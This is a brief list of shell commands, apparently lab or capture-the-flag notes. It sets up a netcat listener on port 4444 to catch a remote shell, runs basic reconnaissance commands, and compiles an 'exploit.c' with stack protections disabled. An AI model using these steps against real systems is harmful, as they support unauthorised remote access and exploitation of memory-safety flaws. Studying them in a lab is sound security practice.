nc -lvnp 4444

ls
whoami
pwd

gcc -fno-stack-protector -z execstack -no-pie exploit.c -o exploit